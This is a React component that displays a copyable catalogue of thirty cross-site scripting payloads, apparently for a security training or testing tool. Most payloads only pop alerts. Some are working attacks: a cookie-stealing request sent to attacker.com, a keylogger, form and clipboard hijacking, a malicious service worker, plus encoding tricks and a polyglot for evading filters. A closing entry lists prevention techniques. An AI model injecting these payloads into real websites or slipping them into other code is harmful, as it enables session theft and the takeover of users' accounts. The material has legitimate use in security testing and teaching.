
import React, { useState } from 'react';
import { Copy, Eye, EyeOff, Code, Zap } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Textarea } from '@/components/ui/textarea';
import { useToast } from '@/hooks/use-toast';

interface XSSPayload {
  id: number;
  name: string;
  description: string;
  payload: string;
  category: 'basic' | 'advanced' | 'evasion' | 'polyglot';
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced' | 'Expert';
}

const XSSPayloads = () => {
  const { toast } = useToast();
  const [editablePayloads, setEditablePayloads] = useState<{[key: number]: string}>({});
  const [showPayload, setShowPayload] = useState<{[key: number]: boolean}>({});

  const payloads: XSSPayload[] = [
    {
      id: 1,
      name: "Basic Alert",
      description: "Simple JavaScript alert box - classic XSS test",
      payload: `<script>alert('XSS Vulnerability Found!')</script>`,
      category: 'basic',
      difficulty: 'Beginner'
    },
    {
      id: 2,
      name: "Document Cookie Theft",
      description: "Steals and displays user cookies",
      payload: `<script>alert('Cookies: ' + document.cookie)</script>`,
      category: 'basic',
      difficulty: 'Beginner'
    },
    {
      id: 3,
      name: "Redirect Attack",
      description: "Redirects user to malicious site",
      payload: `<script>window.location='https://example.com/malicious'</script>`,
      category: 'basic',
      difficulty: 'Beginner'
    },
    {
      id: 4,
      name: "HTML Injection",
      description: "Injects HTML content without script tags",
      payload: `<img src=x onerror="alert('HTML Injection Successful')">`,
      category: 'basic',
      difficulty: 'Beginner'
    },
    {
      id: 5,
      name: "SVG Vector",
      description: "Uses SVG elements for XSS execution",
      payload: `<svg onload="alert('SVG XSS')"></svg>`,
      category: 'advanced',
      difficulty: 'Intermediate'
    },
    {
      id: 6,
      name: "Event Handler",
      description: "Uses various HTML event handlers",
      payload: `<body onload="alert('Event Handler XSS')">`,
      category: 'advanced',
      difficulty: 'Intermediate'
    },
    {
      id: 7,
      name: "JavaScript Protocol",
      description: "Uses javascript: protocol in URLs",
      payload: `<a href="javascript:alert('Protocol XSS')">Click me</a>`,
      category: 'advanced',
      difficulty: 'Intermediate'
    },
    {
      id: 8,
      name: "Base64 Encoded",
      description: "Base64 encoded payload to bypass filters",
      payload: `<script>eval(atob('YWxlcnQoJ0Jhc2U2NCBYU1MnKQ=='))</script>`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 9,
      name: "String Concatenation",
      description: "Breaks up keywords to evade detection",
      payload: `<script>ale\u0072t('Evasion XSS')</script>`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 10,
      name: "CSS Expression",
      description: "Uses CSS expressions (IE specific)",
      payload: `<div style="background:url('javascript:alert(1)')">`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 11,
      name: "DOM Based XSS",
      description: "Exploits DOM manipulation vulnerabilities",
      payload: `<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>`,
      category: 'advanced',
      difficulty: 'Advanced'
    },
    {
      id: 12,
      name: "Polyglot XSS",
      description: "Works in multiple contexts (HTML, JS, CSS)",
      payload: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert('Polyglot') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(//XSS//)//`,
      category: 'polyglot',
      difficulty: 'Expert'
    },
    {
      id: 13,
      name: "Template Literal",
      description: "Uses ES6 template literals for execution",
      payload: `<script>\`\${alert('Template XSS')}\`</script>`,
      category: 'advanced',
      difficulty: 'Advanced'
    },
    {
      id: 14,
      name: "Data URI XSS",
      description: "Uses data URIs to execute JavaScript",
      payload: `<iframe src="data:text/html,<script>alert('Data URI XSS')</script>"></iframe>`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 15,
      name: "Web Workers XSS",
      description: "Advanced XSS using Web Workers",
      payload: `<script>
var blob = new Blob(['onmessage=function(e){postMessage("XSS via Web Worker")}'], {type: 'application/javascript'});
var worker = new Worker(URL.createObjectURL(blob));
worker.onmessage = function(e) { alert(e.data); };
worker.postMessage('start');
</script>`,
      category: 'polyglot',
      difficulty: 'Expert'
    },
    {
      id: 16,
      name: "Filter Bypass - Double Encoding",
      description: "Uses double URL encoding to bypass input filters",
      payload: `%253Cscript%253Ealert%2528%2527Double%2520Encoding%2520XSS%2527%2529%253C%252Fscript%253E`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 17,
      name: "DOM Manipulation",
      description: "Exploits DOM properties for XSS execution",
      payload: `<div id="xss"></div><script>document.getElementById('xss').innerHTML='<img src=x onerror=alert("DOM XSS")>'</script>`,
      category: 'advanced',
      difficulty: 'Intermediate'
    },
    {
      id: 18,
      name: "Form Hijacking",
      description: "Hijacks form submissions to steal data",
      payload: `<script>
document.forms[0].onsubmit = function() {
  alert('Form hijacked! Data: ' + new FormData(this).get('username'));
  return false;
};
</script>`,
      category: 'advanced',
      difficulty: 'Advanced'
    },
    {
      id: 19,
      name: "Session Theft",
      description: "Attempts to steal user session tokens",
      payload: `<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://attacker.com/steal', true);
xhr.send('session=' + document.cookie);
alert('Session data sent to attacker');
</script>`,
      category: 'advanced',
      difficulty: 'Expert'
    },
    {
      id: 20,
      name: "Keylogger Injection",
      description: "Injects a simple keylogger to capture keystrokes",
      payload: `<script>
var keys = '';
document.onkeypress = function(e) {
  keys += String.fromCharCode(e.which);
  if (keys.length > 20) {
    console.log('Captured: ' + keys);
    keys = '';
  }
};
alert('Keylogger active');
</script>`,
      category: 'polyglot',
      difficulty: 'Expert'
    },
    {
      id: 21,
      name: "Browser Information Theft",
      description: "Collects browser and system information",
      payload: `<script>
var info = {
  userAgent: navigator.userAgent,
  platform: navigator.platform,
  language: navigator.language,
  screen: screen.width + 'x' + screen.height,
  url: location.href
};
alert('Browser Info: ' + JSON.stringify(info, null, 2));
</script>`,
      category: 'basic',
      difficulty: 'Intermediate'
    },
    {
      id: 22,
      name: "Local Storage Access",
      description: "Accesses and displays localStorage data",
      payload: `<script>
var storage = {};
for (var i = 0; i < localStorage.length; i++) {
  var key = localStorage.key(i);
  storage[key] = localStorage.getItem(key);
}
alert('Local Storage: ' + JSON.stringify(storage));
</script>`,
      category: 'advanced',
      difficulty: 'Intermediate'
    },
    {
      id: 23,
      name: "Audio/Video Hijacking",
      description: "Attempts to access user's camera/microphone",
      payload: `<script>
navigator.mediaDevices.getUserMedia({video: true, audio: true})
.then(function(stream) {
  alert('Camera/Microphone access granted!');
})
.catch(function(err) {
  alert('Media access denied: ' + err);
});
</script>`,
      category: 'advanced',
      difficulty: 'Expert'
    },
    {
      id: 24,
      name: "Geolocation Tracking",
      description: "Attempts to access user's location",
      payload: `<script>
navigator.geolocation.getCurrentPosition(
  function(pos) {
    alert('Location: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
  },
  function(err) {
    alert('Location access denied: ' + err.message);
  }
);
</script>`,
      category: 'advanced',
      difficulty: 'Advanced'
    },
    {
      id: 25,
      name: "WebRTC IP Leak",
      description: "Attempts to discover user's real IP address",
      payload: `<script>
var pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
pc.createDataChannel("");
pc.createOffer().then(offer => pc.setLocalDescription(offer));
pc.onicecandidate = function(ice) {
  if (ice.candidate) {
    var ip = ice.candidate.candidate.split(' ')[4];
    if (ip && ip.match(/\d+\.\d+\.\d+\.\d+/)) {
      alert('Detected IP: ' + ip);
    }
  }
};
</script>`,
      category: 'polyglot',
      difficulty: 'Expert'
    },
    {
      id: 26,
      name: "CSRF Token Bypass",
      description: "Attempts to bypass CSRF protection",
      payload: `<script>
fetch('/api/user/profile', {method: 'GET'})
.then(response => response.text())
.then(html => {
  var token = html.match(/csrf-token['"]\s*content=['"]([^'"]+)/);
  if (token) alert('CSRF Token found: ' + token[1]);
});
</script>`,
      category: 'evasion',
      difficulty: 'Expert'
    },
    {
      id: 27,
      name: "HTML5 WebSQL Injection",
      description: "Exploits deprecated WebSQL for data access",
      payload: `<script>
if (window.openDatabase) {
  var db = openDatabase('', '', '', '');
  db.transaction(function(tx) {
    tx.executeSql('SELECT * FROM sqlite_master', [], function(tx, results) {
      alert('WebSQL Tables: ' + results.rows.length);
    });
  });
}
</script>`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 28,
      name: "Service Worker Hijack",
      description: "Registers malicious service worker",
      payload: `<script>
if ('serviceWorker' in navigator) {
  var blob = new Blob([
    'self.addEventListener("fetch", e => e.respondWith(new Response("Hijacked by XSS")))'
  ], {type: 'application/javascript'});
  navigator.serviceWorker.register(URL.createObjectURL(blob));
  alert('Malicious service worker registered');
}
</script>`,
      category: 'polyglot',
      difficulty: 'Expert'
    },
    {
      id: 29,
      name: "Clipboard Hijacking",
      description: "Hijacks clipboard operations",
      payload: `<script>
document.addEventListener('copy', function(e) {
  e.clipboardData.setData('text/plain', 'Hijacked: ' + window.getSelection().toString());
  e.preventDefault();
});
navigator.clipboard.writeText('XSS Clipboard Hijack').then(() => {
  alert('Clipboard hijacked');
});
</script>`,
      category: 'advanced',
      difficulty: 'Advanced'
    },
    {
      id: 30,
      name: "Educational Summary",
      description: "Comprehensive XSS prevention guide",
      payload: `<!-- XSS PREVENTION TECHNIQUES:

1. INPUT VALIDATION:
   - Whitelist allowed characters
   - Validate data types and formats
   - Reject suspicious patterns

2. OUTPUT ENCODING:
   - HTML entity encoding (&lt; &gt; &amp;)
   - JavaScript encoding (\x3c \x3e)
   - URL encoding (%3C %3E)
   - CSS encoding (\\3c \\3e)

3. CONTENT SECURITY POLICY (CSP):
   - Content-Security-Policy: default-src 'self'
   - Blocks inline scripts and eval()
   - Restricts resource loading

4. SECURE CODING PRACTICES:
   - Use parameterized queries
   - Avoid innerHTML, use textContent
   - Validate server-side always
   - Use frameworks with built-in protection

5. TESTING METHODS:
   - Manual payload testing
   - Automated security scanners
   - Code review processes
   - Penetration testing

Remember: XSS can lead to account hijacking, data theft, 
malware distribution, and complete site compromise!
-->
<script>
alert('Educational XSS Summary - Always test responsibly!');
</script>`,
      category: 'basic',
      difficulty: 'Beginner'
    }
  ];

  const copyToClipboard = (text: string, payloadName: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        title: "Copied to clipboard",
        description: `${payloadName} payload copied successfully`,
      });
    });
  };

  const togglePayloadVisibility = (id: number) => {
    setShowPayload(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const updatePayload = (id: number, newPayload: string) => {
    setEditablePayloads(prev => ({ ...prev, [id]: newPayload }));
  };

  const getCurrentPayload = (payload: XSSPayload) => {
    return editablePayloads[payload.id] || payload.payload;
  };

  const getCategoryColor = (category: string) => {
    switch (category) {
      case 'basic': return 'text-green-400 bg-green-400/10 border-green-400/20';
      case 'advanced': return 'text-blue-400 bg-blue-400/10 border-blue-400/20';
      case 'evasion': return 'text-yellow-400 bg-yellow-400/10 border-yellow-400/20';
      case 'polyglot': return 'text-red-400 bg-red-400/10 border-red-400/20';
      default: return 'text-gray-400 bg-gray-400/10 border-gray-400/20';
    }
  };

  const getDifficultyColor = (difficulty: string) => {
    switch (difficulty) {
      case 'Beginner': return 'text-green-300';
      case 'Intermediate': return 'text-yellow-300';
      case 'Advanced': return 'text-orange-300';
      case 'Expert': return 'text-red-300';
      default: return 'text-gray-300';
    }
  };

  return (
    <div className="space-y-6">
      <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
        {payloads.map((payload) => (
          <Card key={payload.id} className="bg-gray-900/50 border-gray-700 hover:border-cyan-500/50 transition-all duration-300">
            <CardHeader className="pb-3">
              <div className="flex items-center justify-between">
                <CardTitle className="text-lg font-semibold text-white flex items-center">
                  <Zap className="h-4 w-4 mr-2 text-cyan-400" />
                  {payload.name}
                </CardTitle>
                <div className={`text-xs px-2 py-1 rounded border ${getCategoryColor(payload.category)}`}>
                  {payload.category.toUpperCase()}
                </div>
              </div>
              <div className="flex items-center justify-between">
                <CardDescription className="text-gray-300 text-sm">
                  {payload.description}
                </CardDescription>
                <span className={`text-xs font-medium ${getDifficultyColor(payload.difficulty)}`}>
                  {payload.difficulty}
                </span>
              </div>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="relative">
                <Textarea
                  value={getCurrentPayload(payload)}
                  onChange={(e) => updatePayload(payload.id, e.target.value)}
                  className="bg-black/50 border-gray-600 text-cyan-100 font-mono text-sm min-h-[100px] resize-none"
                  placeholder="XSS Payload..."
                />
                <Button
                  size="sm"
                  variant="ghost"
                  className="absolute top-2 right-2 h-8 w-8 p-0 hover:bg-gray-700"
                  onClick={() => togglePayloadVisibility(payload.id)}
                >
                  {showPayload[payload.id] ? (
                    <EyeOff className="h-4 w-4 text-gray-400" />
                  ) : (
                    <Eye className="h-4 w-4 text-gray-400" />
                  )}
                </Button>
              </div>
              
              <div className="flex gap-2">
                <Button
                  onClick={() => copyToClipboard(getCurrentPayload(payload), payload.name)}
                  className="flex-1 bg-cyan-600 hover:bg-cyan-700 text-white"
                  size="sm"
                >
                  <Copy className="h-4 w-4 mr-2" />
                  Copy Payload
                </Button>
                <Button
                  onClick={() => updatePayload(payload.id, payload.payload)}
                  variant="outline"
                  className="border-gray-600 text-gray-300 hover:bg-gray-700"
                  size="sm"
                >
                  Reset
                </Button>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>
    </div>
  );
};

export default XSSPayloads;
